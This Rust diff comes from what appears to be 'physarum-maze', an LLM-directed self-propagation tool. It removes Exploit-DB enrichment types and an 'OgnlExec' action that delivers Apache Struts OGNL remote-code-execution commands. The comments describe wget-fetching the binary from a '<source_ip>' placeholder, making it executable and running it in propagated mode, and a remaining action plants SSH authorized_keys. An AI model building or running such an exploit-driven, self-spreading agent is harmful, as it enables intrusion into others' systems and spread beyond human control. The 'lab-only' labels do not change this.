@@ -255,24 +255,6 @@ pub struct DiscoveryQuery {
     /// is shared with the LLM. The executor holds the private key locally.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub ephemeral_pubkey: Option<String>,
-
-    /// Enrichment capabilities available to the LLM for this attempt.
-    ///
-    /// Non-empty when physarum-maze has an offline Exploit-DB index loaded.
-    /// The LLM may request one enrichment round-trip per attempt by including
-    /// an `EnrichmentRequest` in its `PropagationStrategy` response.
-    /// physarum-maze performs the lookup and feeds the result back as
-    /// `enrichment_result` in a second (continuation) DiscoveryQuery call.
-    #[serde(default, skip_serializing_if = "Vec::is_empty")]
-    pub available_enrichment_capabilities: Vec<EnrichmentCapability>,
-
-    /// Structured exploit-reference metadata returned after an `EnrichmentRequest`.
-    ///
-    /// Present only on the continuation call (Turn 2b). The LLM uses this
-    /// metadata to reason about technique and construct `OgnlExec.commands`
-    /// or other bounded delivery steps without seeing raw exploit payloads.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub enrichment_result: Option<EnrichmentResult>,
 }
 
 /// Minimal lineage context sent to the LLM — no secrets, no raw payloads.
@@ -329,13 +311,6 @@ pub struct PropagationStrategy {
     pub preconditions: Vec<String>,
     pub validation_check: Option<String>,
     pub safety_notes: Vec<String>,
-    /// LLM may request Exploit-DB enrichment before finalising strategy.
-    ///
-    /// When present, physarum-maze performs the lookup, builds an `EnrichmentResult`,
-    /// and calls the LLM a second time (Turn 2b) with the result. The second response
-    /// must NOT include another `enrichment_request` (one round-trip per attempt).
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub enrichment_request: Option<EnrichmentRequest>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -502,38 +477,6 @@ pub enum BootstrapAction {
         /// e.g. "/root/.ssh/authorized_keys"
         dest_path: String,
     },
-
-    /// Apache Struts OGNL multi-command delivery (replaces `__struts_bypass__` sentinel).
-    ///
-    /// Each element of `commands` becomes a single HTTP POST with an OGNL-wrapped OS command.
-    /// Struts OGNL does NOT reliably chain shell commands with `&&` — one command per request
-    /// is the correct delivery pattern for `freemarker.Execute` and similar sandboxed evaluators.
-    ///
-    /// The executor iterates `commands` in order, wrapping each in the standard
-    /// SecurityMemberAccess bypass template and sending a separate POST.
-    /// A non-2xx response is acceptable (Struts often returns 400/500 after RCE fires).
-    ///
-    /// Typical multi-step sequence (LLM decides):
-    ///   commands[0] = "wget http://<source_ip>:8001/physarum-maze -O /tmp/physarum-maze"
-    ///   commands[1] = "chmod +x /tmp/physarum-maze"
-    ///   commands[2] = "/tmp/physarum-maze --mode propagated ..."
-    ///
-    /// Source IP is substituted by the executor from the local network interface — never
-    /// hardcoded by the LLM. The LLM uses the `<source_ip>` placeholder in commands.
-    OgnlExec {
-        /// One OS command per element. Executor sends one POST per command.
-        /// Use `<source_ip>` as a placeholder; executor substitutes the real IP.
-        commands: Vec<String>,
-        /// HTTP port. Defaults to 8080 for Struts when absent.
-        #[serde(default, skip_serializing_if = "Option::is_none")]
-        port: Option<u16>,
-        /// URL path prefix. Defaults to "/" when absent.
-        #[serde(default, skip_serializing_if = "Option::is_none")]
-        path_prefix: Option<String>,
-        /// Extra HTTP headers beyond the OGNL Content-Type. Rarely needed.
-        #[serde(default, skip_serializing_if = "Vec::is_empty")]
-        extra_headers: Vec<(String, String)>,
-    },
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -572,13 +515,6 @@ pub struct LlmAttemptEvidence {
     /// Empty when no CVE candidates were enriched for this target.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub cve_candidate_ids: Vec<String>,
-    /// True when the LLM requested Exploit-DB enrichment during this attempt.
-    #[serde(default)]
-    pub enrichment_requested: bool,
-    /// Exploit-DB reference ID selected after enrichment (e.g. "EDB-44556").
-    /// Absent when no enrichment was performed or no reference was selected.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub exploit_reference_id: Option<String>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -604,104 +540,4 @@ pub enum NextAction {
     MarkDeadEnd,
     ContinueOrganismLoop,
     MaxAttemptsReached,
-}
-
-// ── Exploit-DB enrichment types (Issue #144) ─────────────────────────────────
-
-/// Enrichment data source the LLM may request.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-pub enum EnrichmentCapability {
-    /// Offline Exploit-DB index embedded in the physarum-maze binary.
-    /// Always available when the binary was built with `EXPLOITDB_CSV` data.
-    ExploitDb,
-    /// Local SearchSploit installation (`searchsploit --json`).
-    /// Available only when `searchsploit` is present in PATH at runtime.
-    SearchSploitLocal,
-}
-
-/// LLM's request for exploit-reference enrichment.
-///
-/// Included as `PropagationStrategy::enrichment_request` when the LLM wants
-/// to look up structured exploit metadata before committing to a strategy.
-/// physarum-maze performs the lookup and returns an `EnrichmentResult`.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct EnrichmentRequest {
-    /// Which enrichment source to query.
-    pub source: EnrichmentCapability,
-    /// CVE identifier to look up (e.g. `"CVE-2020-17530"`).
-    pub cve_id: String,
-    /// LLM's reasoning for requesting this enrichment — recorded in lineage.
-    pub reason: String,
-}
-
-/// Structured exploit-reference metadata returned to the LLM after enrichment.
-/// Raw exploit payloads are never included — only bounded metadata.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct ExploitReference {
-    /// Exploit-DB numeric ID as a string (e.g. `"44556"`).
-    pub exploit_reference_id: String,
-    /// Source that produced this reference.
-    pub source: EnrichmentCapability,
-    /// CVE this reference covers.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub cve_id: Option<String>,
-    /// Affected product name (e.g. `"Apache Struts"`).
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub product: Option<String>,
-    /// Affected version range string (e.g. `"2.0.0 - 2.5.29"`).
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub version_range: Option<String>,
-    /// Target platform (e.g. `"linux"`, `"windows"`, `"multiple"`).
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub platform: Option<String>,
-    /// Exploit delivery class (e.g. `"webapps"`, `"remote"`, `"local"`).
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub exploit_type: Option<String>,
-    /// True when Exploit-DB marks the exploit as verified.
-    #[serde(default)]
-    pub verified_status: bool,
-    /// True when authentication is required before exploitation.
-    #[serde(default)]
-    pub requires_auth: bool,
-    /// True when user interaction (e.g. click, open file) is needed.
-    #[serde(default)]
-    pub requires_user_interaction: bool,
-    /// True when exploit needs outbound callback (e.g. wget to attacker).
-    #[serde(default)]
-    pub requires_outbound_callback: bool,
-    /// Expected effect (e.g. `"Remote Code Execution"`, `"Privilege Escalation"`).
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub expected_effect: Option<String>,
-    /// Safety classification for PolicyGate (`"lab-only"`, `"destructive"`, etc.).
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub safety_class: Option<String>,
-    /// Brief technique summary — the LLM uses this to reason about delivery steps.
-    /// Never contains raw payloads. Example:
-    /// `"OGNL injection via Content-Type header; freemarker.Execute; one command per request"`.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
-    pub summary: Option<String>,
-}
-
-/// physarum-maze's response to an `EnrichmentRequest`.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct EnrichmentResult {
-    /// The original request that triggered this lookup.
-    pub request: EnrichmentRequest,
-    /// References found. Empty on cache miss.
-    pub references: Vec<ExploitReference>,
-    /// Lookup outcome for the LLM and lineage.
-    pub status: EnrichmentLookupStatus,
-}
-
-/// Outcome of an enrichment lookup.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub enum EnrichmentLookupStatus {
-    /// One or more references found.
-    Found { count: usize },
-    /// CVE not present in the local index.
-    NotFound,
-    /// Policy or scope check blocked the request.
-    PolicyBlocked { reason: String },
-    /// Source not available at runtime (e.g. searchsploit not in PATH).
-    SourceUnavailable,
 }
